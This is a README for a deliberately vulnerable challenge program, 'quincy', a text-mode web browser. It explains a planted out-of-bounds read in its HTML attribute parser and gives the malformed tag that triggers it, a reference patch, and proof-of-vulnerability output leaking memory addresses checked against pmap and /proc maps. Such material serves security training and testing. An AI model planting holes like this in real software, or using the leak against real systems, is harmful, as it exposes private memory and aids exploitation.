# quincy

Quincy is a text-based web browser. It fetches documents over HTTP, parses HTML,
and pretty-prints it to make it easy to read.

## concept

Connect, send a command, get result.

The challenge, poller, and PoV do not have any persistent data.

## commands

* `parse-doc` : fetches, parses, and pretty-prints an HTML document from a URL
* `fetch` : fetches and verbatim-prints the contents at a URL
* `parse-url` : parses and inspects a URL

## polling and other testing

The poller (and proof-of-vulnerability, described below) run a web server
using the Sinatra framework on a separate thread in the poller/PoV process.
The challenge returns the address the connection comes from to make calling
back to this web server easier.

Most activities in the poller should have documentation or be very
self-descriptively-named. The poller does not store any data on disk.

Running the poller with a filename in the `DUMP_EXAMPLE` environment
variable will also dump the poller's traffic into a file suitable as
an example for a fuzzer.

## variant and vulnerability

The vulnerability is in the HTML parser. Attributes without paired
quotes are not parsed correctly, allowing a carefully constructed document
to leak private memory.

For reference, an HTML tag looks like this:

```html
<br data-asdf="qqqq" data-ink='emerald of chivor'>
```

The `data-asdf="asdf"` part is an attribute, as is
and `data-ink='emerald of chivor'`. The attribute names are `data-asdf` and
`data-ink`, and their corresponding attribute values are `qqqq` and
`emerald of chivor`, respectively. The single- or double-quotation marks
must be matched, but there's no semantic difference between the two.

### vulnerability

The `Attribute` constructor in `html/attribute.cpp` is the vulnerable part of
the HTML parser. It correctly bounds-checks an attribute name, but does not
bounds check while looking for the quote to end an attribute value. As such,
the following will not be parsed correctly:

```html
<marquee class='heyyyyyyyyyyyyy>let's go</marquee>
```

When parsing beyond the end of the tag, the memory there almost always has a
private address or some other private data, and this ends up as part of the
attribute, and eventually gets pretty-printed to the connecting client.

### reference patch

The fix is to bounds-check while looking for the closing quote:

```c++
  while (quot != base[scan]) {
    scan++;
#ifdef PATCH_STOP_PAST_END_OF_ATTRS
    if (scan > end_of_attrs) {
      valid = false;
      return;
    }
#endif
  }
```

### proof of vulnerability

The Proof of Vulnerability (PoV) starts a web server using Sinatra, in a
separate thread in the PoV process, just like the poller. Once this has had a
second to start, it then connects to the running challenge, and requests that
it `parse-doc` the malformed document to trigger the vulnerability.

When receiving the private data, the PoV doesn't have a way to determine which
parts are within the challenge's memory space, so it prints out the whole range
in 64-bit chunks in the hope that at least one is an address.

For example, a provisionally-successful PoV may print out:

```
INFO: ["  <html>", "   <head>", "     <title>", "       cool", "    </title>", "  </head>", "  <body>", "     <hr>", "    <marquee ", "    class='heyyyyyyyyyyyyy\x00\x00!\x00\x00\x00\x00\x00\x00\x00pkH\xEC\x00V\x00\x00`kH\xEC\x00V\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x00\x00\x00\x00\x00\x00\x00\xB8\xE4\xA4\xEA\x00V\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x10\xE8\xA4\xEA\x00V\x00\x00P\xE4\xA4\xEA\x00V\x00\x00\xB0\x81H\xEC\x00V\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00hr\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xD8\x81H\xEC\x00V\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00opener: Tag(name: `body` self_closing: 0) closer: CloseTag(name: `body`) children: 7 nodes)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'", "     >", "       let's go", "    </marquee>", "    <hr>", "  </body>", " </html>"]
DEBUG: sorry in advance for the next 307 addresses
ADDRESS=0000000000000021
ADDRESS=7000000000000000
ADDRESS=6b70000000000000
ADDRESS=486b700000000000
ADDRESS=ec486b7000000000
ADDRESS=00ec486b70000000
ADDRESS=5600ec486b700000
ADDRESS=005600ec486b7000
ADDRESS=00005600ec486b70
ADDRESS=6000005600ec486b
ADDRESS=6b600000[...]
```

The first thing to note is the `<marquee` tag has a, frankly, absurd `class`
attribute value, compared to the one above.

The second thing to notice is the large number of addresses that are sent to
stdout.
These addresses can be checked against the running challenge using the `pmap`
command-line tool, or the `/proc` filesystem. In the container running the
challenge:

```
root@1aca1ac55eb4:/mnt# PORT=3017 ./variants/unpatched/build/quincy
^Z
[1]+  Stopped                 PORT=3017 ./variants/unpatched/build/quincy
```

After the PoV runs successfully, use ctrl-z to pause the challenge, and use
`ps` to determine its pid:

```
root@1aca1ac55eb4:/mnt# ps
  PID TTY          TIME CMD
    1 pts/0    00:00:00 bash
  253 pts/0    00:00:00 quincy
  254 pts/0    00:00:00 ps
```

In this case, the PID is "253". With that, we can use `pmap PID` to figure out
what address ranges are what:

```
root@1aca1ac55eb4:/mnt# pmap 253
253:   ./variants/unpatched/build/quincy
00005600ea7cc000    520K r-x-- quincy
00005600eaa4d000      8K r---- quincy
00005600eaa4f000      4K rw--- quincy
00005600ec46f000    132K rw---   [ anon ]
00007f722ea8a000   1948K r-x-- libc-2.27.so
00007f722ec71000   2048K ----- libc-2.27.so
00007f722ee71000     16K r---- libc-2.27.so
00007f722ee[...]
```

Or, `cat /proc/PID/maps` will show equivalent information if `pmap` isn't
available:

```
root@1aca1ac55eb4:/mnt# cat /proc/253/maps
5600ea7cc000-5600ea84e000 r-xp 00000000 00:62 486                        /mnt/variants/unpatched/build/quincy
5600eaa4d000-5600eaa4f000 r--p 00081000 00:62 486                        /mnt/variants/unpatched/build/quincy
5600eaa4f000-5600eaa50000 rw-p 00083000 00:62 486                        /mnt/variants/unpatched/build/quincy
5600ec46f000-5600ec490000 rw-p 00000000 00:00 0                          [heap]
7f722ea8a000-7f722ec71000 r-xp 00000000 08:01 2884028                    /lib/x86_64-linux-gnu/libc-2.27.so
7f722ec71000-7f722ee71000 ---p 001e7000 08:01 2884028                    /lib/x86_64-linux-gnu/libc-2.27.so
7f722ee71000-7f722ee75000 r--p 001e7000 08:01 2884028                    /lib/x86_64-linux-gnu/libc-2.27.so
7f722ee[...]
```

In this case, the address range starting at `00005600ea7cc000` is the executable
part of the binary, and we see an address in that range in the spew from the
PoV:

```
ADDRESS=00005600ec486b70
```

To resume the challenge binary, use the `fg` command to bring it to the
foreground. From there it can be stopped with ctrl-c as normal:

```
root@1aca1ac55eb4:/mnt# fg
PORT=3017 ./variants/unpatched/build/quincy
^C
root@1aca1ac55eb4:/mnt# ps
  PID TTY          TIME CMD
    1 pts/0    00:00:00 bash
  257 pts/0    00:00:00 ps
root@1aca1ac55eb4:/mnt#
```

When running the same PoV against the patched binary, it simply doesn't work:

```
INFO: ["  <html>", "   <head>", "     <title>", "       cool", "    </title>", "  </head>", "  <body>", "     <hr>", "    <marquee>", "       let's go", "    </marquee>", "    <hr>", "  </body>", " </html>"]
INFO: ruby pov.rb
== Sinatra has ended his set (crowd applauds)[2020-01-22 19:11:27] INFO  going to shutdown ...
[2020-01-22 19:11:27] INFO  WEBrick::HTTPServer#start done.
== Sinatra has ended his set (crowd applauds)

Traceback (most recent call last):
        9: from pov.rb:165:in `<main>'
        8: from pov.rb:79:in `run!'
        7: from /usr/local/lib/ruby/2.6.0/timeout.rb:108:in `timeout'
        6: from /usr/local/lib/ruby/2.6.0/timeout.rb:33:in `catch'
        5: from /usr/local/lib/ruby/2.6.0/timeout.rb:33:in `catch'
        4: from /usr/local/lib/ruby/2.6.0/timeout.rb:33:in `block in catch'
        3: from /usr/local/lib/ruby/2.6.0/timeout.rb:93:in `block in timeout'
        2: from pov.rb:80:in `block in run!'
        1: from pov.rb:121:in `parse_doc'
pov.rb:140:in `assert': Couldn't find the payload in the expected place (RuntimeError)
root@0bb5f6500e26:/pov#
```

Note how instead of an absurd `class` attribute value on the `<marquee>` tag,
no attributes are pretty-printed.
